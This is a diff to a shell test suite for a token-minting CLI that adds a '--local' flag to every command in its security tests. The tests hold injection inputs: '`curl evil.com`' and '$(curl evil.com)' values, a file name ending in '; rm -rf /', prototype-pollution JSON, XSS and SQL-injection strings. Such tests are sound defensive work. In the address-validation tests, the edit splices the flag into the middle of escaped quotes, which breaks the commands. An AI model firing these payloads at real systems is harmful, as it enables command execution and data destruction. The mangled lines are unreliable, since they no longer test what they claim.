@@ -36,7 +36,7 @@ teardown() {
     local incomplete_json="${TEST_TEMP_DIR}/incomplete.txf"
     echo '{"version": "2.0", "state": {incomplete' > "${incomplete_json}"
 
-    run_cli "verify-token -f ${incomplete_json}"
+    run_cli "verify-token -f ${incomplete_json} --local"
     assert_failure
     # Match: "JSON parse error" or "Invalid JSON" (parser variations)
     assert_output_contains "JSON.*parse.*error|Invalid.*JSON|parse.*error" "Error must indicate JSON parsing failure"
@@ -45,21 +45,21 @@ teardown() {
     local invalid_json="${TEST_TEMP_DIR}/invalid.txf"
     echo '{"version": "2.0", "state": {},}' > "${invalid_json}"
 
-    run_cli "verify-token -f ${invalid_json}"
+    run_cli "verify-token -f ${invalid_json} --local"
     assert_failure
 
     # Test 3: Empty file
     local empty_file="${TEST_TEMP_DIR}/empty.txf"
     touch "${empty_file}"
 
-    run_cli "verify-token -f ${empty_file}"
+    run_cli "verify-token -f ${empty_file} --local"
     assert_failure
 
     # Test 4: Non-JSON content
     local binary_file="${TEST_TEMP_DIR}/binary.txf"
     echo -e "\x00\x01\x02\x03\x04\x05" > "${binary_file}"
 
-    run_cli "verify-token -f ${binary_file}"
+    run_cli "verify-token -f ${binary_file} --local"
     assert_failure
 
     # Verify we get error messages, not crashes
@@ -84,14 +84,14 @@ teardown() {
     local malicious_data='{"name":"Test","__proto__":{"evil":"payload"},"constructor":{"prototype":{"polluted":true}}}'
 
     local token_file="${TEST_TEMP_DIR}/inject-token.txf"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${malicious_data}' -o ${token_file}"
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${malicious_data}' --local -o ${token_file}"
 
     # Minting should succeed (data is just bytes)
     assert_success
     assert_file_exists "${token_file}"
 
     # Verify token is valid
-    run_cli "verify-token -f ${token_file}"
+    run_cli "verify-token -f ${token_file} --local"
     assert_success
 
     # Verify data is stored as hex-encoded bytes (not parsed)
@@ -120,7 +120,7 @@ console.log('SAFE');
     # Test with various special characters
     local special_chars='{"test":"\\u0000\\u0001\\u001f<script>alert(1)</script>","nested":{"deep":"value"}}'
 
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${special_chars}' -o ${TEST_TEMP_DIR}/special.txf"
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${special_chars}' --local -o ${TEST_TEMP_DIR}/special.txf"
     assert_success
 
     log_success "SEC-INPUT-002: JSON injection and prototype pollution prevented"
@@ -152,7 +152,7 @@ console.log('SAFE');
     # Current working directory is TEST_TEMP_DIR
     local traversal_path="../evil.txf"
     local exit_code=0
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -o ${traversal_path}" || exit_code=$?
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${traversal_path}" || exit_code=$?
 
     # Behavior: CLI allows this because it's valid file system syntax
     if [[ $exit_code -eq 0 ]]; then
@@ -169,7 +169,7 @@ console.log('SAFE');
     local unique_id=$(generate_unique_id)
     local absolute_path="/tmp/unicity-test-${unique_id}.txf"
     local exit_code=0
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -o ${absolute_path}" || exit_code=$?
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${absolute_path}" || exit_code=$?
 
     if [[ $exit_code -eq 0 ]]; then
         log_info "RESULT: Absolute paths accepted (expected CLI behavior)"
@@ -184,7 +184,7 @@ console.log('SAFE');
     # Test 3: Verify files don't escape normal boundaries
     # Create token in test directory - should stay there
     local normal_path="${TEST_TEMP_DIR}/normal.txf"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -o ${normal_path}"
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${normal_path}"
     assert_success
     assert_file_exists "${normal_path}"
     log_info "✓ Normal path handling works correctly"
@@ -216,7 +216,7 @@ console.log('SAFE');
 
     # Test 2: Command injection in file path
     local cmd_in_path="${TEST_TEMP_DIR}/token.txf; rm -rf /"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -o '${cmd_in_path}'"
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o '${cmd_in_path}'"
 
     # Should either fail or treat as literal filename
     # No files should be deleted
@@ -225,7 +225,7 @@ console.log('SAFE');
     # Test 3: Command injection in data field
     local cmd_in_data='`curl evil.com`'
     local exit_code=0
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${cmd_in_data}' -o ${TEST_TEMP_DIR}/safe.txf" || exit_code=$?
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${cmd_in_data}' --local -o ${TEST_TEMP_DIR}/safe.txf" || exit_code=$?
 
     # Should succeed - data is just bytes
     if [[ $exit_code -eq 0 ]]; then
@@ -236,10 +236,10 @@ console.log('SAFE');
     # Test 4: Shell metacharacters in recipient address
     local cmd_in_address='DIRECT://$(curl evil.com)'
     local exit_code=0
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -o ${TEST_TEMP_DIR}/token-cmd.txf" || exit_code=$?
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${TEST_TEMP_DIR}/token-cmd.txf" || exit_code=$?
 
     if [[ $exit_code -eq 0 ]]; then
-        run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${TEST_TEMP_DIR}/token-cmd.txf -r '${cmd_in_address}' -o /dev/null"
+        run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${TEST_TEMP_DIR}/token-cmd.txf -r '${cmd_in_address}' --local -o /dev/null"
 
         # Should fail with invalid address format (not execute command)
         assert_failure
@@ -265,7 +265,7 @@ console.log('SAFE');
     local huge_amount="999999999999999999999999999999"
     local exit_code=0
     local token_file="${TEST_TEMP_DIR}/huge.txf"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c ${huge_amount} -o ${token_file}" || exit_code=$?
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c ${huge_amount} --local -o ${token_file}" || exit_code=$?
 
     # JavaScript BigInt should handle arbitrary precision
     if [[ $exit_code -eq 0 ]]; then
@@ -291,7 +291,7 @@ console.log('SAFE');
 
     # Test 2: NEGATIVE coin amount (CRITICAL - MUST BE REJECTED)
     local negative_amount="-1000000000000000000"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c ${negative_amount} -o /dev/null"
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c ${negative_amount} --local -o /dev/null"
 
     # CRITICAL: Negative amounts must ALWAYS fail
     assert_failure "Negative coin amounts MUST be rejected"
@@ -302,7 +302,7 @@ console.log('SAFE');
     # Test 3: Zero amount
     local zero_token="${TEST_TEMP_DIR}/zero.txf"
     local exit_code=0
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c 0 -o ${zero_token}" || exit_code=$?
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c 0 --local -o ${zero_token}" || exit_code=$?
 
     # Zero may be allowed or rejected - both are acceptable
     if [[ $exit_code -eq 0 ]]; then
@@ -317,12 +317,12 @@ console.log('SAFE');
     fi
 
     # Test 4: Non-numeric amount (MUST fail)
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c 'not-a-number' -o /dev/null"
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c 'not-a-number' --local -o /dev/null"
     assert_failure "Non-numeric amounts must be rejected"
     log_info "✓ Non-numeric input correctly rejected"
 
     # Test 5: Floating point instead of integer
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c '123.456' -o /dev/null"
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c '123.456' --local -o /dev/null"
     # May succeed (parsed as integer) or fail (expected whole numbers)
     local fp_result=$?
     if [[ $fp_result -ne 0 ]]; then
@@ -364,41 +364,41 @@ console.log('SAFE');
 
     # Create token for testing
     local token="${TEST_TEMP_DIR}/token.txf"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -o ${token}"
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${token}"
     assert_success
 
     # Test 1: SQL injection attempt (not applicable but test anyway)
     local sql_injection="'; DROP TABLE tokens;--"
     # Use double quotes for the entire command to allow variable expansion
     # The -r parameter will receive the value as-is
-    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \"${sql_injection}\" -o /dev/null"
+    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \ --local"${sql_injection}\" -o /dev/null"
     assert_failure
     assert_output_contains "invalid address format"
 
     # Test 2: XSS attempt
     local xss_attempt="<script>alert(1)</script>"
-    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \"${xss_attempt}\" -o /dev/null"
+    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \ --local"${xss_attempt}\" -o /dev/null"
     assert_failure
     assert_output_contains "invalid address format"
 
     # Test 3: Null bytes
     local null_bytes="DIRECT://\x00\x00\x00"
-    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \"${null_bytes}\" -o /dev/null"
+    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \ --local"${null_bytes}\" -o /dev/null"
     assert_failure
     assert_output_contains "invalid address format"
 
     # Test 4: Empty address
-    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \"\" -o /dev/null"
+    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \ --local"\" -o /dev/null"
     assert_failure
     assert_output_contains "invalid address format"
 
     # Test 5: Invalid format (no DIRECT:// prefix)
-    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \"invalidaddress\" -o /dev/null"
+    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \ --local"invalidaddress\" -o /dev/null"
     assert_failure
     assert_output_contains "invalid address format"
 
     # Test 6: DIRECT:// with non-hex characters
-    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \"DIRECT://zzzzgggg\" -o /dev/null"
+    run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${token} -r \ --local"DIRECT://zzzzgggg\" -o /dev/null"
     assert_failure
     assert_output_contains "invalid address format"
 
@@ -423,7 +423,7 @@ console.log('SAFE');
 
     # Try to create file with embedded null-like sequence
     local exit_code=0
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -o '${filename}${null_suffix}'" || exit_code=$?
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o '${filename}${null_suffix}'" || exit_code=$?
 
     if [[ $exit_code -eq 0 ]]; then
         # Verify file was created with full name (no truncation)
@@ -436,7 +436,7 @@ console.log('SAFE');
 
     # Test 2: Various problematic filename characters
     local special_filename="${TEST_TEMP_DIR}/token-;-&-|->.txf"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -o '${special_filename}'"
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o '${special_filename}'"
 
     # Should either succeed with escaped name or reject
     # No security issue as long as no command execution occurs
@@ -444,7 +444,7 @@ console.log('SAFE');
     # Test 3: Unicode characters in filename
     local unicode_filename="${TEST_TEMP_DIR}/token-文件.txf"
     local exit_code=0
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -o '${unicode_filename}'" || exit_code=$?
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o '${unicode_filename}'" || exit_code=$?
 
     # Should succeed on systems with UTF-8 support
     if [[ $exit_code -eq 0 ]] && [[ -f "${unicode_filename}" ]]; then
@@ -469,7 +469,7 @@ console.log('SAFE');
         local boundary_data=$(printf 'X%.0s' $(seq 1 ${size}))
 
         local exit_code=0
-        run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${boundary_data}' -o ${TEST_TEMP_DIR}/boundary-${size}.txf" || exit_code=$?
+        run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${boundary_data}' --local -o ${TEST_TEMP_DIR}/boundary-${size}.txf" || exit_code=$?
 
         # Should succeed for all reasonable sizes
         if [[ $exit_code -eq 0 ]]; then
